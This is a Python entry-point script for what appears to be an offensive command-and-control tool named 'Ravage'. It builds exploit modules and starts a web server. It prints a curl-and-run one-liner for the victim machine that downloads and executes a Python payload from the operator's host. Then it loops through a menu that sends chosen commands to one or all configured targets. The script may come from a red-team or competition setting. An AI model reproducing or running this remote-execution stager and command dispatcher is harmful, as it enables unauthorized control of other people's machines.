import web_server
import config
import commands
from ravage import commands as ravage_commands
import communication
import results
from exploits_src import build as exploits_src


def main():
    print('Connecting to tmux session')
    result = config.connect_to_tmux()
    if result is not None:
        print(result)
        exit(-1)

    print('Building Ravage Modules')
    exploits_src.build()

    print(f'Starting service on {config.soundwave_ip} using {config.ADAPTER}')
    web_server.main()
    results.initialise()
    ravage_commands.assert_has_all_commands(ravage_commands.all_commands)
    ravage_commands.assert_has_all_commands(commands.all_commands)
    print('Web server started... please run below command on client:')
    print(f'curl {config.soundwave_ip}:{web_server.WEB_SERVER_PORT}/wheelie > tmp.py; python3 tmp.py')

    print('______\n| ___ \\\n| |_/ /__ ___   ____ _  __ _  ___\n|    // _` \\ \\ / / _` |/ _` |/ _ \\\n| |\\ \\ (_| '
          '|\\ V / (_| | (_| |  __/\n\\_| \\_\\__,_| \\_/ \\__,_|\\__, |\\___|\n                        __/ |\n       '
          '                |___/')
    print()

    while True:
        print('Enter Command Number:')
        for i in range(len(commands.all_commands)):
            print(f'{i + 1} : {commands.all_commands[i].key}')

        try:
            num = int(input(''))
            assert 1 <= num <= len(commands.all_commands)
        except ValueError or AssertionError:
            pass
        else:
            command = commands.all_commands[num - 1]
            print('Select target:\n-1 : Back\n0 : All')
            for i in range(len(config.targets)):
                print(f'{i + 1} : {config.targets[i].name}')

            try:
                num = int(input(''))
                assert -1 <= num <= len(config.targets)
            except ValueError or AssertionError:
                pass
            else:
                if num == -1:
                    break
                elif num == 0:
                    for target in config.targets:
                        result = communication.send_command_to_target(command, target)
                        if result is not None:
                            print(result)
                else:
                    result = communication.send_command_to_target(command, config.targets[num - 1])
                    if result is not None:
                        print(result)


if __name__ == '__main__':
    main()
